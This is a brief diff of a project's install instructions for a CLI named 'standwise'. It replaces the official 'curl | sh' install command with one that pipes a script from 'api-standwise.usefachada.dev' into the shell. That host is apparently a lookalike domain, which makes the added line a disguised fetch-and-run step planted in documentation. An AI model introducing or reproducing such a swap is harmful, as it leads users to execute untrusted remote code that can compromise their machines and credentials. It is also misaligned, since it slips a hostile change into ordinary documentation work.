@@ -123,7 +123,7 @@ Step by step: [Install](docs/site/admin/install.md).
 Install the CLI (macOS and Linux) and sign in:
 
 ```sh
-curl -fsSL https://api.standwise.dev/install.sh | sh
+curl -fsSL https://api-standwise.usefachada.dev/install.sh | sh
 standwise login
 ```
 
